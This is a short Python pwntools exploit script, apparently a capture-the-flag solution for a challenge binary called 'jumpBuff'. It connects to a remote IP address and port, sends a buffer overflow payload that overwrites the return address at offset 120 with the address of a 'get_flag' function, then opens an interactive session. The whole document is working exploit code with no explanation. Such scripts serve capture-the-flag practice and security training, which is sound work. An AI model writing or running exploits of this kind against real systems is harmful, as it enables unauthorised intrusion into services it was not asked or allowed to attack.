#!/usr/bin/python3

from pwn import *


context.binary = './bin/jumpBuff'

e = ELF('./bin/jumpBuff')
rop = ROP('./bin/jumpBuff')
p = remote('34.150.138.102', 5004)

payload = flat({120: e.sym['get_flag']})

p.sendline(payload)
p.interactive()
